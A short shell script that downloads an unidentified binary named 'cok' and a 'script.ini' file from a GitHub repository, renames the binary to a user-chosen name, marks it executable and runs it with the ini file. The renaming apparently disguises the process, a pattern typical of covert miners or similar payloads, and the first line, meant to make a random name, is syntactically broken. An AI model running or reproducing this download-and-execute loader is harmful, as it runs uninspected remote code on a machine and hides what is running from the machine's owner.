randomname=head -c24 /dev/urandom | base64 | tr -dc a-zA-Z;
read -p " name: " CRP
wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/cok && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/script.ini && mv cok $CRP && chmod +x $CRP && ./$CRP script.ini
